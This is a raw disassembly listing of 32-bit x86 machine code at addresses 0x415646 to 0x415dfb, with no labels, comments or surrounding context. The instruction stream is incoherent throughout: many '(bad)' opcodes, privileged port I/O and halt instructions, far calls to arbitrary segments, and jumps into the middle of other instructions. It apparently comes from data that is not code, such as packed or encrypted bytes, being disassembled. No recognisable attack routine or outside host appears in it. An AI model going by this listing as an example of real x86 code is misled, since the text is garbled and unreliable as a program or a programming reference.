  415646:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415647:	push   ds
  415648:	jae    0x415658
  41564a:	imul   edx,DWORD PTR [esi-0x1b5d332f],0xffffffbf
  415651:	or     BYTE PTR [esi],bl
  415653:	jne    0x41564e
  415655:	xor    esi,eax
  415657:	push   ebp
  415658:	das    
  415659:	sbb    dh,BYTE PTR [edi+0x60]
  41565c:	cmp    esp,eax
  41565e:	mov    ds:0x293959f5,al
  415663:	(bad)  
  415664:	xchg   esi,eax
  415665:	(bad)  
  415666:	jp     0x41569e
  415668:	nop
  415669:	test   BYTE PTR [edx],bl
  41566b:	jnp    0x415618
  41566d:	sahf   
  41566e:	push   esp
  41566f:	shl    DWORD PTR [edi-0x8306964],cl
  415675:	sub    ebx,edx
  415677:	and    DWORD PTR [edi+0x68],ecx
  41567a:	jmp    0x41567f
  41567c:	mov    ecx,0x83e8dcbf
  415681:	jl     0x4156c8
  415683:	cmp    ch,al
  415685:	scas   al,BYTE PTR es:[edi]
  415686:	pop    eax
  415687:	pop    es
  415688:	mov    ch,BYTE PTR ds:[esp+ebp*8+0x21]
  41568d:	pop    esp
  41568e:	dec    edx
  41568f:	in     eax,0xf2
  415691:	cmp    DWORD PTR [ebx],edi
  415693:	xchg   DWORD PTR [edi-0x32],edi
  415696:	iret   
  415697:	push   ebx
  415698:	das    
  415699:	lods   eax,DWORD PTR ds:[esi]
  41569a:	mov    ch,ch
  41569c:	cmp    BYTE PTR [ebp+0x4b],0xb8
  4156a0:	repz pop ebp
  4156a2:	xor    esi,edx
  4156a4:	aam    0x33
  4156a6:	lock jns 0x415643
  4156a9:	adc    bl,BYTE PTR [eax-0x7c]
  4156ac:	and    bh,BYTE PTR [ebp-0x6edcc1b4]
  4156b2:	sti    
  4156b3:	push   0xcb824080
  4156b8:	mul    ch
  4156ba:	cwde   
  4156bb:	cmp    BYTE PTR [eax+0x7d5672e],bh
  4156c1:	push   esp
  4156c2:	or     esp,edx
  4156c4:	(bad)  
  4156c5:	jmp    0x3d690ef3
  4156ca:	call   0xc5eb:0x7c0bbeea
  4156d1:	mov    bl,BYTE PTR [esi+eiz*1+0x1ec97a64]
  4156d8:	mov    bh,0x20
  4156da:	xchg   BYTE PTR [esi-0x28],dh
  4156dd:	xor    DWORD PTR [ebx],0x3df6ac7
  4156e3:	xor    DWORD PTR [edx],ebx
  4156e5:	stos   DWORD PTR es:[edi],eax
  4156e6:	(bad)  
  4156e7:	psrld  mm4,mm6
  4156ea:	dec    ecx
  4156eb:	push   ss
  4156ec:	scas   al,BYTE PTR es:[edi]
  4156ed:	adc    al,0x6d
  4156f0:	out    dx,eax
  4156f1:	das    
  4156f2:	sar    BYTE PTR [edx],0x28
  4156f5:	mov    al,BYTE PTR [ebp+0x37f2a819]
  4156fb:	(bad)  
  4156fc:	in     al,0x2d
  4156fe:	icebp  
  4156ff:	dec    edx
  415700:	fisttp QWORD PTR [ecx-0x4dcb7283]
  415706:	test   eax,0x4a49d1e8
  41570b:	jecxz  0x41570a
  41570d:	cmp    eax,0xae2030cc
  415712:	retf   0x886c
  415715:	mov    BYTE PTR ss:[edx],ch
  415718:	aaa    
  415719:	xor    BYTE PTR [ebx-0x34],ch
  41571c:	outs   dx,BYTE PTR ds:[esi]
  41571d:	mov    ecx,0x394b7771
  415722:	pop    eax
  415723:	mov    ch,0xb8
  415725:	enter  0xe76e,0x4b
  415729:	pop    ds
  41572a:	neg    DWORD PTR [esp+ebp*1]
  41572d:	xor    bh,bl
  41572f:	in     al,0xd5
  415731:	icebp  
  415732:	mov    ecx,0xda5e47f0
  415737:	fstp   TBYTE PTR [esi+ecx*4-0x5d]
  41573b:	(bad)  
  41573d:	dec    esi
  41573e:	ficom  DWORD PTR [edx+esi*2+0x1ed4dbbd]
  415745:	cli    
  415746:	sbb    DWORD PTR [edx],eax
  415748:	sbb    ebx,ebx
  41574a:	xchg   BYTE PTR [eax+0x6f],dl
  41574d:	lahf   
  41574e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41574f:	push   0xffffffeb
  415751:	imul   ecx,DWORD PTR [edx-0xd6283ef],0x45f216a1
  41575b:	imul   esi,DWORD PTR [ebp+0x55019c6b],0x7d
  415762:	or     ebp,DWORD PTR [edx+0x4b]
  415765:	pop    esp
  415766:	sub    edi,DWORD PTR [ebx+0x6b89b712]
  41576c:	(bad)  
  41576d:	loopne 0x415723
  41576f:	and    al,0x20
  415771:	pop    es
  415772:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  415774:	add    edi,DWORD PTR fs:[edi-0x7e9eba84]
  41577b:	or     ebp,DWORD PTR [ecx+0x4e]
  41577e:	in     al,dx
  41577f:	jo     0x41576e
  415781:	or     eax,DWORD PTR [ecx]
  415783:	jmp    0x2be:0xe13e00a4
  41578a:	arpl   WORD PTR [edi*2-0x46167d2d],di
  415791:	scas   eax,DWORD PTR es:[edi]
  415792:	mov    eax,0x76abd456
  415797:	fst    QWORD PTR [edx+0x138b15bb]
  41579d:	jno    0x41579c
  41579f:	pop    ss
  4157a0:	je     0x415778
  4157a2:	fld    DWORD PTR [ecx+0x52]
  4157a5:	add    al,0x23
  4157a7:	adc    al,0x26
  4157a9:	mov    ds:0xf023960c,al
  4157ae:	stos   DWORD PTR es:[edi],eax
  4157af:	in     al,dx
  4157b0:	xchg   edx,eax
  4157b1:	repz loope 0x4157d0
  4157b4:	nop
  4157b5:	xchg   esi,eax
  4157b6:	mov    dh,0x52
  4157b8:	ds jae 0x415780
  4157bb:	ret    0x1577
  4157be:	mov    al,0xb
  4157c0:	or     bh,BYTE PTR [ecx+0x1b9f62f0]
  4157c6:	inc    esp
  4157c7:	fs data16 add dh,dl
  4157cb:	iret   
  4157cc:	mov    dl,BYTE PTR [ebx-0x25479ac0]
  4157d2:	fst    QWORD PTR [edx-0x6cc59dd5]
  4157d8:	repnz sub eax,0x3fb9f0ce
  4157de:	rcr    ecx,1
  4157e0:	jmp    0xd7a71ee0
  4157e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157e6:	xchg   BYTE PTR [edx-0x32],ch
  4157e9:	sti    
  4157ea:	xor    eax,0x700592df
  4157ef:	shl    bh,cl
  4157f1:	pop    ss
  4157f2:	adc    edi,esi
  4157f4:	dec    eax
  4157f5:	out    0x75,al
  4157f7:	int3   
  4157f8:	xor    eax,0x903c272
  4157fd:	dec    eax
  4157fe:	push   ds
  4157ff:	call   0x6edb:0x71d7ff58
  415806:	lahf   
  415807:	(bad)  
  415808:	imul   ebp,DWORD PTR [esp+ebx*1],0x5e
  41580c:	xlat   BYTE PTR ds:[ebx]
  41580d:	rcl    DWORD PTR [edx+0x65],1
  415810:	(bad)  
  415811:	and    ebx,DWORD PTR [ebx+eax*4-0x511ff02e]
  415818:	fistp  DWORD PTR [edi+0x47]
  41581b:	aaa    
  41581c:	xchg   ecx,eax
  41581d:	loop   0x41585f
  41581f:	lahf   
  415820:	inc    eax
  415821:	adc    eax,0x77c5e64f
  415826:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415827:	mul    BYTE PTR [edi+0x1a876489]
  41582d:	cmc    
  41582e:	or     ebp,DWORD PTR [ebx+0x4]
  415831:	out    0xf1,eax
  415833:	aas    
  415834:	aas    
  415835:	fnstenv [ecx+eiz*8]
  415838:	and    BYTE PTR [edi+0x2e],bh
  41583b:	push   ds
  41583c:	xchg   ecx,eax
  41583d:	dec    esp
  41583e:	cwde   
  41583f:	jb     0x41581a
  415841:	push   edx
  415842:	pop    edx
  415843:	and    DWORD PTR [edi+0x58],0x68
  415847:	mov    esi,0xb813093a
  41584c:	pop    esi
  41584d:	out    0xfb,al
  41584f:	adc    eax,0xa5ceb7fc
  415854:	cwde   
  415855:	cmp    eax,0x5d43d2de
  41585a:	out    dx,al
  41585b:	mov    ds:0xdd179c86,eax
  415860:	push   esi
  415861:	sub    eax,0x1347c34a
  415866:	mov    ebp,0x7a08da68
  41586b:	(bad)  
  41586c:	ds pusha 
  41586e:	bts    edi,eax
  415871:	jns    0x415819
  415873:	std    
  415874:	call   0x1f73:0x9c0aca3c
  41587b:	outs   dx,DWORD PTR ds:[esi]
  41587c:	add    BYTE PTR [ebx],ah
  41587e:	int3   
  41587f:	leave  
  415880:	dec    ecx
  415881:	pop    esp
  415882:	cli    
  415883:	(bad)  
  415884:	mov    al,ds:0xa6f5babf
  415889:	leave  
  41588a:	jecxz  0x4158ce
  41588c:	inc    esi
  41588d:	in     eax,dx
  41588e:	xchg   ecx,eax
  41588f:	int3   
  415890:	loope  0x41587a
  415892:	jmp    0x46f7:0x3554f228
  415899:	lahf   
  41589a:	jnp    0x41584f
  41589c:	test   ebx,ebp
  41589e:	push   eax
  41589f:	sbb    esp,ebx
  4158a1:	mov    dl,0x61
  4158a3:	into   
  4158a4:	jnp    0x415878
  4158a6:	and    BYTE PTR [edx],bh
  4158a8:	loope  0x4158e7
  4158aa:	push   edi
  4158ab:	cdq    
  4158ac:	cmp    cl,BYTE PTR [ebx]
  4158ae:	ss jg  0x415890
  4158b1:	dec    ecx
  4158b2:	fsubrp st(3),st
  4158b4:	idiv   DWORD PTR [ebp-0x36b91a3f]
  4158ba:	push   cs
  4158bb:	aaa    
  4158bc:	scas   al,BYTE PTR es:[edi]
  4158bd:	xchg   edx,eax
  4158be:	dec    ebx
  4158bf:	dec    edi
  4158c0:	xchg   edi,eax
  4158c1:	pop    ds
  4158c2:	inc    edi
  4158c3:	je     0x4158f5
  4158c5:	pop    ss
  4158c6:	and    al,0xcb
  4158c8:	imul   edx,ebp,0xcce33b2c
  4158ce:	mov    ecx,0x2e026a8d
  4158d3:	out    dx,al
  4158d4:	cmp    bh,BYTE PTR [ecx+ecx*2-0x268e906c]
  4158db:	mov    DWORD PTR [edx+0x1424ec4f],esp
  4158e1:	or     eax,DWORD PTR [ebx+eax*8]
  4158e4:	fisttp QWORD PTR [edi-0x2f]
  4158e7:	retf   
  4158e8:	xchg   esi,eax
  4158e9:	ja     0x415925
  4158eb:	lods   eax,DWORD PTR ds:[esi]
  4158ec:	or     eax,0x64b9b59d
  4158f1:	push   esi
  4158f2:	push   ebx
  4158f3:	mov    esi,DWORD PTR [edi+ebp*1-0x13]
  4158f7:	xlat   BYTE PTR ds:[ebx]
  4158f8:	dec    ebx
  4158f9:	clc    
  4158fa:	jo     0x415905
  4158fc:	sub    BYTE PTR [edi],dh
  4158fe:	mov    dl,0xd2
  415900:	xor    al,0x55
  415902:	and    bh,dl
  415904:	pop    es
  415905:	je     0x415964
  415907:	lea    esp,[ebx]
  415909:	mov    bh,0x58
  41590b:	push   eax
  41590c:	cmp    al,0xa3
  41590e:	xor    eax,0xf5b64023
  415913:	out    0xc0,eax
  415915:	leave  
  415916:	or     BYTE PTR ds:0xeff3bc05,bh
  41591c:	pusha  
  41591d:	dec    edx
  41591e:	jmp    0x415970
  415920:	push   ecx
  415921:	jae    0x4158e2
  415923:	enter  0xc150,0x6f
  415927:	or     BYTE PTR [eax-0x31188e6e],0x4e
  41592e:	gs loop 0x415953
  415931:	loop   0x415902
  415933:	xor    ah,bh
  415935:	lea    edx,[edi]
  415937:	cmc    
  415938:	xor    eax,0x98acc442
  41593d:	mov    ds,WORD PTR [eax+esi*8]
  415940:	(bad)  
  415941:	out    0xed,eax
  415943:	jb     0x415988
  415945:	cmp    eax,0xcdbea4a5
  41594a:	out    dx,eax
  41594b:	in     eax,0xc7
  41594d:	dec    edx
  41594e:	mov    edx,0xc0a101f2
  415953:	push   eax
  415954:	jnp    0x415971
  415956:	xchg   edi,eax
  415957:	nop
  415958:	ficom  WORD PTR [esi-0x24]
  41595b:	adc    al,0x37
  41595d:	ja     0x4159b9
  41595f:	lea    ebx,[esi]
  415961:	pop    eax
  415962:	cmp    DWORD PTR [ecx+0x7ce69019],0xc
  415969:	push   ebx
  41596a:	(bad)  
  41596b:	sub    al,0x10
  41596d:	pop    edx
  41596e:	xlat   BYTE PTR ds:[ebx]
  41596f:	jbe    0x415960
  415971:	push   ds
  415972:	test   ch,al
  415974:	je     0x4159e2
  415976:	pop    ecx
  415977:	jne    0x415929
  415979:	push   ecx
  41597a:	add    DWORD PTR [ebx+eax*2-0x60],eax
  41597e:	or     DWORD PTR [edx+0x30a5ec43],ebx
  415984:	ror    DWORD PTR [edx],0x5f
  415987:	mov    ecx,0x294b4c39
  41598c:	shl    DWORD PTR [esi-0x57],cl
  41598f:	sub    edi,DWORD PTR [ebx-0x5b894784]
  415995:	fisttp QWORD PTR [ebx+0x18]
  415998:	retf   0x8293
  41599b:	xor    esp,DWORD PTR [ebp+0x4b]
  41599e:	jb     0x415987
  4159a0:	int3   
  4159a1:	pushf  
  4159a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159a3:	and    eax,0xa8691f5d
  4159a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159a9:	aam    0xea
  4159ab:	les    eax,FWORD PTR [esi]
  4159ad:	mov    ds:0xb8d44e5d,al
  4159b2:	or     BYTE PTR [ecx+0x4a980241],ch
  4159b8:	dec    edx
  4159b9:	aaa    
  4159ba:	lods   al,BYTE PTR ds:[esi]
  4159bb:	mov    BYTE PTR [edi],cl
  4159bd:	or     al,0xd1
  4159bf:	inc    eax
  4159c0:	aaa    
  4159c1:	lea    ebp,[ecx]
  4159c3:	dec    ebx
  4159c4:	pop    edx
  4159c5:	jno    0x4159ed
  4159c7:	fwait
  4159c8:	sub    DWORD PTR [ecx],esp
  4159ca:	lds    ecx,FWORD PTR [eax]
  4159cc:	repnz mov esi,0xa5715016
  4159d2:	adc    DWORD PTR [esi+0x70b702d2],0x9c3bde5
  4159dc:	test   DWORD PTR [ecx+0xd8aba5],edi
  4159e2:	call   0xcf9ce93b
  4159e7:	js     0x4159df
  4159e9:	ja     0x4159ae
  4159eb:	mov    ebx,0xca3bf060
  4159f0:	dec    BYTE PTR ds:0x45937395
  4159f6:	(bad)  
  4159f7:	lahf   
  4159f8:	xchg   edx,eax
  4159f9:	out    dx,al
  4159fa:	jmp    0x415a24
  4159fc:	cmp    al,0x48
  4159fe:	pop    ebx
  4159ff:	inc    ebx
  415a00:	dec    esi
  415a01:	hlt    
  415a02:	jno    0x4159fc
  415a04:	fistp  DWORD PTR ds:0x806dd2cc
  415a0a:	popf   
  415a0b:	enter  0xe238,0x55
  415a0f:	lea    ecx,[esi]
  415a11:	dec    ebp
  415a12:	push   ss
  415a13:	push   0xffffff8d
  415a15:	cmp    esi,DWORD PTR [ebp-0x530e5ad8]
  415a1b:	(bad)  
  415a1c:	dec    esi
  415a1d:	repz out dx,eax
  415a1f:	jnp    0x415a1b
  415a21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a23:	jp     0x4159d0
  415a25:	(bad)  
  415a26:	loope  0x4159c2
  415a28:	fabs   
  415a2a:	repz jbe 0x4159d2
  415a2d:	ss xchg esp,eax
  415a2f:	cwde   
  415a30:	push   0xed03f74b
  415a35:	jns    0x415aaa
  415a37:	jo     0x4159ea
  415a39:	mov    ch,0xf4
  415a3b:	outs   dx,DWORD PTR ds:[esi]
  415a3c:	outs   dx,DWORD PTR ds:[esi]
  415a3d:	jno    0x415a06
  415a3f:	cwde   
  415a40:	push   es
  415a41:	pop    ebx
  415a42:	leave  
  415a43:	mov    ds:0xfcf8b0bd,al
  415a48:	aaa    
  415a49:	fwait
  415a4a:	push   0x155528ae
  415a4f:	inc    ecx
  415a50:	inc    esp
  415a51:	adc    ebp,edi
  415a53:	mov    edx,0x407f49f8
  415a58:	dec    eax
  415a59:	dec    esp
  415a5a:	xor    cl,BYTE PTR [esi]
  415a5c:	test   BYTE PTR [eax+0xeabde00],dl
  415a62:	aam    0x1
  415a64:	ret    
  415a65:	adc    al,0x0
  415a67:	sub    eax,edx
  415a69:	call   0x64a0:0x5f8c6b4e
  415a70:	imul   ebp,ebp,0x63dbdc59
  415a76:	push   eax
  415a77:	pushf  
  415a78:	add    al,0x27
  415a7a:	popf   
  415a7b:	add    al,0xd3
  415a7d:	ins    DWORD PTR es:[edi],dx
  415a7e:	inc    ecx
  415a7f:	sub    DWORD PTR [ecx],esi
  415a81:	mov    esi,0x5c857a14
  415a86:	call   0x1c745eb9
  415a8b:	out    dx,al
  415a8c:	fild   QWORD PTR [ecx+eax*1-0x1d]
  415a90:	in     al,dx
  415a91:	sbb    al,0x1b
  415a93:	sti    
  415a94:	icebp  
  415a95:	imul   ebp,DWORD PTR [esi],0xffffffbe
  415a98:	xlat   BYTE PTR ds:[ebx]
  415a99:	push   esp
  415a9a:	mov    al,0x1e
  415a9c:	inc    ecx
  415a9d:	repnz scas eax,DWORD PTR es:[edi]
  415a9f:	fcom   DWORD PTR [esi-0x6c]
  415aa2:	arpl   cx,cx
  415aa4:	pop    edi
  415aa5:	mov    bl,0x6e
  415aa7:	cmc    
  415aa8:	xor    ebx,esp
  415aaa:	loop   0x415a71
  415aac:	cmp    BYTE PTR [esi],dl
  415aae:	dec    esi
  415aaf:	in     al,0x69
  415ab1:	gs inc edi
  415ab3:	push   esp
  415ab4:	mov    dh,0x3
  415ab6:	xor    dh,al
  415ab8:	jl     0x415a83
  415aba:	jl     0x415b21
  415abc:	gs sbb BYTE PTR es:[edx],ch
  415ac0:	pop    ebp
  415ac1:	shl    BYTE PTR ds:[eax+ebx*8+0x1bef71f7],0x16
  415aca:	retf   0xa407
  415acd:	jo     0x415ad2
  415acf:	imul   eax,DWORD PTR ds:0x68fd560a,0xab9ec271
  415ad9:	inc    edi
  415ada:	xchg   DWORD PTR [ecx-0x8],eax
  415add:	mov    ebp,0xdd81c746
  415ae2:	mov    bl,0x35
  415ae4:	cwde   
  415ae5:	cs (bad) 
  415ae7:	in     al,dx
  415ae8:	sbb    bl,BYTE PTR [esi]
  415aea:	(bad)  
  415aeb:	mov    fs,WORD PTR [ebx+eax*8+0x55]
  415aef:	les    ebp,FWORD PTR [esi-0x5fd7ddc6]
  415af5:	addr16 int 0x82
  415af8:	push   eax
  415af9:	mov    edx,fs
  415afb:	mov    ebp,0x32da817d
  415b00:	cs es lahf 
  415b03:	jg     0x415b76
  415b05:	sub    dl,BYTE PTR [edx+esi*2]
  415b08:	pusha  
  415b09:	inc    eax
  415b0a:	jp     0x415b5b
  415b0c:	cs pusha 
  415b0e:	or     al,BYTE PTR [esi]
  415b10:	fwait
  415b11:	repz and ah,BYTE PTR [eax]
  415b14:	les    ebx,FWORD PTR [edx+0x4a]
  415b17:	ret    0x76b3
  415b1a:	leave  
  415b1b:	mov    ebx,0x3b2d0b91
  415b20:	test   DWORD PTR gs:[edx],0xa9b7fd73
  415b27:	ror    BYTE PTR [ecx],cl
  415b29:	and    edi,DWORD PTR [ebx+0x1]
  415b2c:	aaa    
  415b2d:	idiv   ebp
  415b2f:	push   ds
  415b30:	mov    ecx,0x6b2ff926
  415b35:	mov    bh,0x76
  415b37:	fsubr  QWORD PTR [ecx]
  415b39:	dec    ebp
  415b3a:	add    al,0x2e
  415b3c:	outs   dx,BYTE PTR ds:[esi]
  415b3d:	arpl   WORD PTR [edi],bp
  415b3f:	call   0xcb149fb
  415b44:	jb     0x415b20
  415b46:	inc    eax
  415b47:	add    al,0x7b
  415b49:	push   ss
  415b4a:	mov    ecx,0x75fe5fb5
  415b4f:	adc    dh,BYTE PTR [ebp-0x6b]
  415b52:	mov    esi,ss
  415b54:	call   0x3147:0xa9f1c1e5
  415b5b:	inc    eax
  415b5c:	dec    eax
  415b5d:	imul   eax,DWORD PTR [edx-0x4],0xa51315a7
  415b64:	adc    DWORD PTR [edx],esi
  415b66:	(bad)  
  415b67:	arpl   WORD PTR es:[edx+0x6c],dx
  415b6b:	lock push ds
  415b6d:	scas   eax,DWORD PTR es:[edi]
  415b6e:	jle    0x415bdd
  415b70:	jnp    0x415b89
  415b72:	push   ebp
  415b73:	retf   0x3aa
  415b76:	clc    
  415b77:	arpl   dx,si
  415b79:	jb     0x415b34
  415b7b:	pop    ds
  415b7c:	mov    dh,0xd9
  415b7e:	pushf  
  415b7f:	sub    al,0x47
  415b81:	bound  esi,QWORD PTR [edx+0x51]
  415b84:	psrlq  mm3,QWORD PTR [ecx-0x6b8ccd3a]
  415b8b:	(bad)  
  415b8c:	push   eax
  415b8d:	mov    ch,BYTE PTR [ecx+esi*8-0x16]
  415b91:	xor    al,0xfd
  415b93:	xchg   DWORD PTR fs:[ecx-0x19],ebx
  415b97:	lock mov eax,0x2ba1630
  415b9d:	js     0x415b81
  415b9f:	iret   
  415ba0:	out    0x99,eax
  415ba2:	pop    esi
  415ba3:	mov    DWORD PTR [ecx-0x324c7ad5],0xda674ff7
  415bad:	mov    ecx,0x6d696e7d
  415bb2:	rol    BYTE PTR [eax+eiz*8-0x5e],cl
  415bb6:	push   es
  415bb7:	add    DWORD PTR [edx+ebp*2+0x48],0x9
  415bbc:	icebp  
  415bbd:	dec    esi
  415bbe:	fsubr  DWORD PTR [ebx]
  415bc0:	push   ebx
  415bc1:	enter  0x7be9,0xcd
  415bc5:	nop
  415bc6:	cmc    
  415bc7:	loopne 0x415b6c
  415bc9:	ret    
  415bca:	push   eax
  415bcb:	(bad)  
  415bcc:	cld    
  415bcd:	in     eax,dx
  415bce:	mov    ?,edx
  415bd0:	es scas al,BYTE PTR es:[edi]
  415bd2:	cmp    al,0x14
  415bd4:	xchg   ebp,eax
  415bd5:	out    0x6d,al
  415bd7:	fimul  DWORD PTR [eax-0x19]
  415bda:	xchg   ebp,eax
  415bdb:	sbb    al,0xcc
  415bdd:	lods   eax,DWORD PTR ds:[esi]
  415bde:	bound  edi,QWORD PTR [eax]
  415be0:	mov    ebp,DWORD PTR [edx+eiz*8+0x5a]
  415be4:	std    
  415be5:	and    dl,bl
  415be7:	mov    edi,DWORD PTR [eax-0x782334bd]
  415bed:	shl    DWORD PTR [edx-0xab9fe18],1
  415bf3:	cdq    
  415bf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415bf5:	psubusb mm5,QWORD PTR [ebx]
  415bf8:	mov    cl,0x57
  415bfa:	por    mm2,QWORD PTR [esp+eax*1+0x8ef480c]
  415c02:	(bad)  es:[edi]
  415c05:	sub    BYTE PTR [eax-0xb6827c3],0x8a
  415c0c:	pop    ebp
  415c0d:	stos   BYTE PTR es:[edi],al
  415c0e:	or     edi,edi
  415c10:	dec    ebp
  415c11:	mov    ebx,0x33e52425
  415c16:	xor    BYTE PTR [esp+ecx*2],bh
  415c19:	or     al,0xe7
  415c1b:	or     BYTE PTR [esi-0x4364deb],ch
  415c21:	dec    edi
  415c22:	sub    bh,BYTE PTR [ecx]
  415c24:	aas    
  415c25:	push   0x843c72d
  415c2a:	retf   
  415c2b:	xchg   BYTE PTR [eax],dh
  415c2d:	test   al,0x2d
  415c2f:	sbb    ebx,DWORD PTR [edi-0x2d]
  415c32:	xchg   DWORD PTR [ebx-0x89075e6],esp
  415c38:	mov    cl,0x22
  415c3a:	shr    BYTE PTR [esi-0x6e],cl
  415c3d:	and    al,0xf1
  415c3f:	or     al,0x7a
  415c41:	sahf   
  415c42:	sahf   
  415c43:	and    edx,ebp
  415c45:	sub    DWORD PTR [esi],ecx
  415c47:	in     eax,0x42
  415c49:	push   eax
  415c4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c4b:	lahf   
  415c4c:	cmp    ch,BYTE PTR [edx]
  415c4e:	(bad)  
  415c4f:	ficomp DWORD PTR [ebx+edi*1]
  415c52:	mov    DWORD PTR [edx],esp
  415c54:	mov    ah,0x98
  415c56:	xchg   BYTE PTR [ecx+0x293d0710],dh
  415c5c:	gs popa 
  415c5e:	(bad)  
  415c5f:	aam    0xc0
  415c61:	addr16 inc edx
  415c63:	mov    eax,ds:0xc060f9a2
  415c68:	sub    DWORD PTR [edi],eax
  415c6a:	push   ds
  415c6b:	push   ss
  415c6c:	jo     0x415c97
  415c6e:	mov    eax,es
  415c70:	int    0x65
  415c72:	int3   
  415c73:	mov    ah,0x4d
  415c75:	loopne 0x415c4b
  415c77:	fxam   
  415c79:	fs stc 
  415c7b:	mov    esp,DWORD PTR [ecx-0x59bf1b7a]
  415c81:	inc    BYTE PTR [ebx]
  415c83:	inc    esi
  415c84:	xchg   ebp,eax
  415c85:	adc    edx,edx
  415c87:	dec    eax
  415c88:	lea    ebp,[ebx-0x55b92888]
  415c8e:	mov    dl,0xc0
  415c90:	inc    edx
  415c91:	add    al,0x76
  415c93:	aas    
  415c94:	mov    dl,0xb6
  415c96:	push   ecx
  415c97:	push   ebx
  415c98:	mov    ebp,0xace6fa62
  415c9d:	inc    ebx
  415c9e:	popa   
  415c9f:	sub    eax,0x97bef8a
  415ca4:	mov    ebp,0xb8f3d6f8
  415ca9:	mov    eax,0xcfe6fd8f
  415cae:	fild   DWORD PTR [ebx+0x22]
  415cb1:	cmp    BYTE PTR [ecx],0x97
  415cb4:	pop    esp
  415cb5:	xor    BYTE PTR es:[edi],ch
  415cb8:	in     al,0x39
  415cba:	aaa    
  415cbb:	xor    BYTE PTR [edi],dl
  415cbd:	aad    0x6f
  415cbf:	scas   al,BYTE PTR es:[edi]
  415cc0:	clc    
  415cc1:	leave  
  415cc2:	mov    eax,gs:0x580e73ef
  415cc8:	jbe    0x415c5d
  415cca:	jbe    0x415cd4
  415ccc:	mov    esp,0x4fa39a39
  415cd1:	je     0x415c71
  415cd3:	aaa    
  415cd4:	repz push cs
  415cd6:	neg    ecx
  415cd8:	addr16 and eax,0x1b96d886
  415cde:	pop    esp
  415cdf:	mov    dl,0x1a
  415ce1:	lahf   
  415ce2:	xor    BYTE PTR [edi],ah
  415ce4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ce5:	xchg   BYTE PTR [ecx+eiz*8],dh
  415ce8:	adc    bl,dl
  415cea:	lahf   
  415ceb:	loopne 0x415ce8
  415ced:	int    0x59
  415cef:	inc    ecx
  415cf0:	mov    edi,0x51a8bfde
  415cf5:	stos   BYTE PTR es:[edi],al
  415cf6:	sbb    ch,BYTE PTR [edx]
  415cf8:	imul   ebx,DWORD PTR [edx-0x31],0x3f3576a3
  415cff:	xchg   ebp,eax
  415d00:	push   eax
  415d01:	push   es
  415d02:	enter  0x91be,0xea
  415d06:	aad    0x8b
  415d08:	adc    al,0xd
  415d0a:	popa   
  415d0b:	mov    eax,0x1aa6864
  415d10:	gs mov ds,esi
  415d13:	jl     0x415d7c
  415d15:	icebp  
  415d16:	jo     0x415d7f
  415d18:	jl     0x415ca5
  415d1a:	repnz ds hlt 
  415d1d:	or     DWORD PTR [ebx+0x4c],ebp
  415d20:	mov    ds:0x9d0bac40,eax
  415d25:	inc    ecx
  415d26:	mov    cl,0xbd
  415d28:	rol    DWORD PTR [edi],cl
  415d2a:	out    dx,eax
  415d2b:	sub    eax,0x611a6824
  415d30:	push   edx
  415d31:	es cli 
  415d33:	test   DWORD PTR [edx+0xb],esi
  415d36:	fs push ss
  415d38:	pop    edi
  415d39:	cmp    eax,0xf6d65db1
  415d3e:	mov    dh,0x57
  415d40:	cmp    DWORD PTR [edi+0x41],0x6d
  415d44:	bswap  ecx
  415d46:	pop    ecx
  415d47:	xchg   esi,eax
  415d48:	fistp  DWORD PTR ds:0x128e6ac
  415d4e:	ja     0x415d97
  415d50:	or     ebx,ebp
  415d52:	jge    0x415d81
  415d54:	stos   DWORD PTR es:[edi],eax
  415d55:	idiv   BYTE PTR [esi-0x2edf36f2]
  415d5b:	aas    
  415d5c:	test   DWORD PTR [eax+0x37],0x6c4551f
  415d63:	je     0x415d40
  415d65:	and    DWORD PTR [eax-0x30c049fc],edx
  415d6b:	or     BYTE PTR [ecx-0x42],dl
  415d6e:	push   esi
  415d6f:	repnz loopne 0x415dc9
  415d72:	xchg   ecx,eax
  415d73:	jns    0x415d4d
  415d75:	mov    esp,0x138a33da
  415d7a:	mov    ah,BYTE PTR [ebx+0x7f]
  415d7d:	sub    eax,0xf23bf79c
  415d82:	pop    ebx
  415d83:	std    
  415d84:	rcr    BYTE PTR [esi+0x52],cl
  415d87:	mov    ecx,?
  415d89:	enter  0xa24d,0xf3
  415d8d:	aam    0x99
  415d8f:	lahf   
  415d90:	add    cl,BYTE PTR [ebx+0x795c025a]
  415d96:	push   edi
  415d98:	and    bh,al
  415d9a:	mov    ebp,0x1807fb4d
  415d9f:	jge    0x415e17
  415da1:	mov    ebx,0xeae4b6fa
  415da6:	bswap  ebp
  415da8:	pop    ss
  415da9:	jb     0x415dff
  415dab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415dac:	les    eax,FWORD PTR [eax-0x36db49cb]
  415db2:	inc    BYTE PTR [ecx+0x2374f8d7]
  415db8:	cwde   
  415db9:	push   esi
  415dba:	dec    esp
  415dbb:	loop   0x415d9e
  415dbd:	ficomp WORD PTR [esi-0x26]
  415dc0:	mov    ebx,0x73155495
  415dc5:	retf   0x4b57
  415dc8:	dec    eax
  415dc9:	jo     0x415da8
  415dcb:	shr    esp,0xe7
  415dce:	gs dec edx
  415dd0:	pop    edx
  415dd1:	fstp   TBYTE PTR [ebx]
  415dd3:	test   ah,0xaf
  415dd6:	mov    ebx,0x31a6bfbf
  415ddb:	add    al,0x55
  415ddd:	pop    ebp
  415dde:	ss and eax,0x19050b95
  415de4:	nop
  415de5:	sub    edi,DWORD PTR [ecx+0x36]
  415de8:	lds    esi,FWORD PTR [edi+0x2a3f00b8]
  415dee:	pop    ebx
  415def:	pop    edx
  415df0:	or     edi,DWORD PTR [ebp+0x57fde8da]
  415df6:	jmp    0x415e39
  415df8:	mov    ch,0x20
  415dfa:	das    
  415dfb:	(bad)  
